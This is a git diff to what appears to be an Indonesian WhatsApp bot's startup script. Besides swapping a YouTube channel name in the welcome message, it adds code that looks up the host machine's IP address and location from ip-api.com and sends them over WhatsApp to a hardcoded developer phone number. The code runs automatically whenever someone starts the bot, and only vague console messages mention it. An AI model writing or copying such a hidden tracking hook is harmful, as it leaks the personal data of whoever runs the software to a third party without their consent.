@@ -107,11 +107,17 @@ console.log(color(`${spc4}                       < =============================
     ]
 
     buttonMessagee = {
-        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA SUBS YT RAMDANI OFFICIAL`,
+        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA SUBS YT SAIPUL ANUAR`,
         footerText: `©${control.watermark2}`,
         buttons: buttonss,
         headerType: 1
     }
+    console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
+fetch(`http://ip-api.com/line`).then(res => res.text())  
+        .then(bu =>{
+       Ramdani.sendMessage("6288279268363@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./foto/Ramdani.jpg'), sourceUrl: `https://wa.me/6289501060783?text=Assalamualaikum` } }})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+   })
     Ramdani.sendMessage(`${control.NomorOwner}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
         caption: '[ • BOTWEA • ]',
         "contextInfo": {
